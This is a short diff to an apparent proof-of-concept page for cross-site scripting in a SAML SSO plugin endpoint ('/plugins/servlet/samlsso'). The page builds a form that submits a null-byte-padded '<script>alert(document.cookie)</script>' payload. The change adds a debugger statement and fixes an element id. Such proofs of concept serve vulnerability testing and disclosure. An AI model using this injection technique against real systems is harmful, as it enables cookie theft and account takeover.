@@ -9,9 +9,10 @@
     <input type="submit" name="Submit">
 </form>
     <script>
+    	debugger;
     	const urlParams = new URLSearchParams(window.location.search);
     	const baseUrl = urlParams.get('baseUrl');
-        document.getElementById("from").setAttribute("action", baseUrl + "/plugins/servlet/samlsso");
+        document.getElementById("form").setAttribute("action", baseUrl + "/plugins/servlet/samlsso");
 
         const payload = `"test>\u0000\u0000\u0000\u0000\u0000\u0000\u0000<script>alert(document.cookie);<\/script>`;
         document.getElementById("text").value = payload;
